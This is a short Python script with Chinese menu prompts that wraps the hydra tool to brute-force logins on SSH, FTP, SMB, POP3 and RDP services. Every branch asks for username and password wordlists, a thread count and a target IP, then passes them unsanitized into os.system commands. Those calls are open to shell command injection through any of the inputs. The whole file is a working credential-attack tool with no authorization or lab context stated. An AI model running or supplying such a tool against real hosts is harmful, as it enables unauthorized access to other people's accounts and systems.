import os

print("请输入要爆破的服务模块：")


print("1.暴力破解ssh")
print("2.暴力破解ftp")
print("3.暴力破解smb")
print("4.暴力破解pop3")
print("5.暴力破解rdp")

mode = input("")

if mode == "1" :
    print("欢迎来到ssh暴力破解")
    print("请输入用户名字典(绝对路径):")
    user = input("")
    print("请输入密码字典():")
    passwd = input("")
    print("请输入线程:")
    thread = input("")
    print("请输入目标ip:")
    ip = input("")
    print("请输入保存日志名字(name.log):")
    filename = input("")
    os.system(f"hydra -L {user} -P {passwd} -t {thread} -o {filename} -vV {ip} ssh")

    print("over")




if mode == "2" :
    print("欢迎来到ftp暴力破解")
    print("请输入用户名字典(绝对路径):")
    user = input("")
    print("请输入密码字典():")
    passwd = input("")
    print("请输入线程:")
    thread = input("")
    print("请输入目标ip:")
    ip = input("")
    os.system(f"hydra {ip} ftp -L {user} -P {passwd} -t {thread} -vV")
    print("over")



if mode == "3" :
    print("欢迎来到smb暴力破解")
    print("请输入用户名字典(绝对路径):")
    user = input("")
    print("请输入密码字典():")
    passwd = input("")
    print("请输入线程:")
    thread = input("")
    print("请输入目标ip:")
    ip = input("")
    os.system(f"hydra -L {user} -P {passwd} -t {thread} {ip} smb")
    print("over")



if mode == "4" :
    print("请输入用户名字典(绝对路径):")
    user = input("")
    print("请输入密码字典():")
    passwd = input("")
    print("请输入线程:")
    thread = input("")
    print("请输入目标ip:")
    ip = input("")
    os.system(f"hydra -L {user} -P {passwd} -t {thread} {ip} pop3")
    print("over")

if mode == "5" :
    print("欢迎来到rdp暴力破解")
    print("请输入用户名字典(绝对路径):")
    user = input("")
    print("请输入密码字典():")
    passwd = input("")
    print("请输入线程:")
    thread = input("")
    print("请输入目标ip:")
    ip = input("")
    os.system(f"hydra {ip} rdp -L {user} -P {passwd} -V -t {thread}")
    print("over")